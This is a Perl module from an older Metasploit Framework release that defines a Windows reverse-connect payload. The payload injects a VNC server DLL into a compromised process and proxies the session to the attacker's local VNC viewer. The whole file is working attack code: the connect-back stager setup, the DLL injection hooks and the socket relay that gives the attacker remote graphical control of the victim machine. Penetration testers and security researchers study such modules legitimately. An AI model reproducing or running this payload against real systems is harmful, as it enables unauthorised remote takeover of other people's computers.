
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_vncinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
use FindBin qw{$RealBin};

sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'Windows Reverse VNC Server DLL Inject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back and inject a VNC server into the remote process',
  'Authors'      => [
                        'Matt Miller <mmiller [at] hick.org> [Unknown License]',
                        'Jarkko Turkulainen <jt [at] klake.org> [Unknown License]',
                    ],
  'UserOpts'     => { 
                        'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
                        'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
                        'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
                    },
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('VNCDLL');
}

sub _InjectDLLName
{
	my $self = shift;

	return "hax0r.dll"; # randomize me!
}

sub HandleConnection {
  my $self = shift;
  my $sock = $self->SocketOut;
  $self->SUPER::HandleConnection;
  sleep(1);

  # Create listener socket
  my $lis = IO::Socket::INET->new(
    'Proto'     => 'tcp',
    'ReuseAddr' => 1,
    'Listen'    => 5,
    'Blocking'  => 0,
    'LocalPort' => $self->GetVar('VNCPORT'),
  );  
  
  if (! $lis) {
    $self->PrintLine("[*] Problem creating the VNC proxy listener: $@");
    $self->KillChild;    
    return;  
  }
  
  $self->PrintLine('[*] VNC proxy listening on port '.$lis->sockport.'...');
  
  if ($self->GetVar('AUTOVNC')) {
    my $pid = fork();
    if (! $pid) {
        system("vncviewer 127.0.0.1:".$self->GetVar('VNCPORT'));
        exit(0);
    }
  }
  
  
  # Accept connection from user
  my $sel = IO::Select->new($lis);
  my $clock = time();
  my $mwait = 300;
  my $csock;
  
  while (! $csock && time < ($clock+$mwait))
  {
    foreach ($sel->can_read(0.25)) { $csock = $lis->accept() }
  }
  
  if (! $csock) {
    $self->PrintLine('[*] VNC proxy did not recieve connection before timeout');
    $self->KillChild;    
    return;
  } 
  
  $self->VNCProxy($sock, $csock);
  $self->PrintLine('[*] VNC proxy finished');
  
  $sock->close;
  $csock->close;
  $self->KillChild;
  return;
}

sub VNCProxy {
  my $self = shift;
  my $srv = shift;
  my $cli = shift;

  foreach ($srv, $cli) {
    $_->blocking(1);
    $_->autoflush(1);
  }

  my $selector = IO::Select->new($srv, $cli);

  LOOPER:
    while(1) {
      my @ready = $selector->can_read;
      foreach my $ready (@ready) {
        if($ready == $cli) {
          my $data;
          $cli->recv($data, 8192);
          last LOOPER if (! length($data));     
          last LOOPER if(!$srv || !$srv->connected);
          $srv->send($data);
        }
        elsif($ready == $srv) {
          my $data;
          $srv->recv($data, 8192);
          last LOOPER if(!length($data));
          last LOOPER if(!$cli || !$cli->connected);
          $cli->send($data);
        }
      }
    }
}

1;
